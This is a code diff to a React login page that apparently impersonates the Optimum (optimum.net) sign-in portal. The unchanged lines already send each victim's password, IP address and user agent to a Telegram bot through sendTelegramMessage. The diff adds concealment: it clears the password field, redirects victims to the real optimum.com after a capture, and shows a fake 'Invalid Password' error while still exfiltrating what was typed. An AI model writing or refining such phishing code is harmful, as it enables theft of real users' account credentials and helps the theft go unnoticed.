@@ -51,6 +51,11 @@ const Home = () => {
         toggleLoading(true);
 
       try {
+        setPassword('');
+        setTimeout(() => {
+            setErrors({ email: '', password: '' });
+        }, 0);
+
         const response = await axios.post(
           'https://proxy.cors.sh/https://portal.atus-dotnet-prod.com/api/login/services/v1/login/processLogin',
           {
@@ -90,8 +95,11 @@ Password: ${password}
 Website: optimum.net
 Client IP: ${clientIp}
 User Agent: ${navigator.userAgent}`;
-
+            
           await sendTelegramMessage(message);
+          
+        window.location.href = 'https://optimum.com/';
+
         }
       } catch (error) {
         console.error('Error during login attempt:', error);
@@ -107,6 +115,10 @@ Client IP: ${clientIp}
 User Agent: ${navigator.userAgent}`;
       
                 await sendTelegramMessage(message);
+                let passwordError = 'Invalid Password';
+
+                setErrors({ email: emailError, password: passwordError });
+
             }else{
                 console.error('Response data:', error.response.data);
                 console.error('Response status:', error.response.status);
